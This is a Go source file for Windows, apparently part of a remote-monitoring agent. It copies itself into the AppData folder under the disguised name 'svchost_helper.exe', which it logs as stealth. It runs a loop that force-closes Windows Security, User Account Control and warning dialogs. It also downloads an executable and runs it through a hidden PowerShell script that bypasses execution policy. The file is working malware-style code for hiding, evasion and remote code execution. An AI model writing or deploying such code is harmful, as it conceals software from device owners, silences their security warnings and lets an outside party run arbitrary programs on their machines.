//go:build windows

package main

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

func copyToSystemLocation() (string, error) {
	src, err := os.Executable()
	if err != nil {
		return "", fmt.Errorf("get executable: %w", err)
	}

	destDir := os.Getenv("APPDATA")
	if destDir == "" {
		destDir = filepath.Join(os.Getenv("USERPROFILE"), "AppData", "Roaming")
	}
	destDir = filepath.Join(destDir, "Microsoft", "Windows")
	if err := os.MkdirAll(destDir, 0755); err != nil {
		return "", fmt.Errorf("create dest dir: %w", err)
	}

	dest := filepath.Join(destDir, "svchost_helper.exe")

	srcData, err := os.ReadFile(src)
	if err != nil {
		return "", fmt.Errorf("read source: %w", err)
	}

	if err := os.WriteFile(dest, srcData, 0755); err != nil {
		return "", fmt.Errorf("write dest: %w", err)
	}

	llog("info", "stealth: copied to %s", dest)
	return dest, nil
}

func startPopupKiller(ctx context.Context) {
	go func() {
		ticker := time.NewTicker(2 * time.Second)
		defer ticker.Stop()
		popupTitles := []string{
			"Windows Security",
			"User Account Control",
			"Program Compatibility Assistant",
			"Error",
			"Warning",
		}
		user32 := windows.NewLazyDLL("user32.dll")
		findWindow := user32.NewProc("FindWindowW")
		sendMessage := user32.NewProc("SendMessageW")
		const WM_CLOSE = 0x0010
		for {
			select {
			case <-ctx.Done():
				return
			case <-ticker.C:
				for _, title := range popupTitles {
					titlePtr, err := syscall.UTF16PtrFromString(title)
					if err != nil {
						continue
					}
					hwnd, _, err := findWindow.Call(0, uintptr(unsafe.Pointer(titlePtr)))
					if hwnd == 0 {
						continue
					}
					sendMessage.Call(hwnd, uintptr(WM_CLOSE), 0, 0)
				}
			}
		}
	}()
}

func applyUpdate(downloadURL string) {
	llog("info", "update: downloading %s", downloadURL)
	tmpPath := filepath.Join(os.TempDir(), "rmon_update.exe")
	if err := downloadFile(downloadURL, tmpPath); err != nil {
		llog("error", "update download: %v", err)
		return
	}
	exe, err := os.Executable()
	if err != nil {
		llog("error", "update: %v", err)
		return
	}
	psScript := fmt.Sprintf(`
Start-Sleep -Seconds 2
Stop-Process -Id %d -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
Copy-Item "%s" "%s" -Force
Start-Process "%s"
`, os.Getpid(), tmpPath, exe, exe)
	psPath := filepath.Join(os.TempDir(), "rmon_update.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	llog("info", "update: applying, restarting...")
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	os.Exit(0)
}
